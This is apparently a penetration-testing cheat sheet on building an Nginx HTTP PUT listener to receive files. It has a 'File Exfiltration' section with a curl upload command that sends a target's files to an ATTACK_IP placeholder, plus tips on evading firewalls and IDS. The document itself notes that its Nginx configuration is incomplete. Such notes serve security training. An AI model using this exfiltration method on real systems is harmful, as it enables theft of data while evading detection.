## Nginx HTTP PUT Setup

Bypassing firewalls and IDS via encrypted transit when **plaintext transfers** (like SMB or FTP) trigger alerts. Nginx is preferred over Apache to prevent **unintended web shell execution**.

Create landing directory for incoming files

```
sudo mkdir -p /var/www/uploads/<DIR>
```

Set ownership to the web service user

```
sudo chown -R www-data:www-data /var/www/uploads/<DIR>
```

Create configuration file at `/etc/nginx/sites-available/upload.conf`

```
server {
    listen <PORT>;
}
```

> ⚠️ Gap: The source provides an incomplete Nginx configuration. For a functional **HTTP PUT** listener, the configuration requires a `location` block with `dav_methods PUT;` enabled and a defined `root` directory, which are missing from the provided text.

Enable the site by symlinking to the enabled directory

```
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

Apply the new configuration

```
sudo systemctl restart nginx.service
```

- **Tool comparison**
    
    - Python3 `uploadserver` module -> `python3 -m uploadserver` -> use for rapid setup without persistent configuration
    - Nginx -> `systemctl restart nginx` -> use for **secure web server** operations and avoiding Apache module security risks
- **Dangerous / misconfigured settings**
    
    - Apache with PHP module enabled: high risk of **web shell execution** if uploads are permitted.
- **Edge cases**
    
    - Apache enables **directory listing** by default, exposing exfiltrated files; Nginx keeps this disabled by default.
- **Gotchas** **Address already in use** failure occurs if port 80 or the chosen port is bound to another process.
    

## Port Conflict Resolution

Nginx fails to start or bind to a specific port due to existing services like `websockify` or default configurations.

Identify the PID holding the port

```
ss -lnpt | grep <PORT>
```

Verify the process name or service

```
ps -ef | grep <PID>
```

Remove the default site to free up port 80

```
sudo rm /etc/nginx/sites-enabled/default
```

## File Exfiltration

Moving sensitive data from a target to a controlled listener using built-in utilities.

Upload local file to the remote Nginx listener

```
curl -T <FILE_PATH> http://<ATTACK_IP>:<PORT>/<DIR>/<FILE_NAME>
```

Confirm integrity of the exfiltrated file

```
sudo tail -1 /var/www/uploads/<DIR>/<FILE_NAME>
```

- **Gotchas** **Plaintext transfer** of sensitive files may be detected by Network IDS; use HTTPS to wrap the transfer.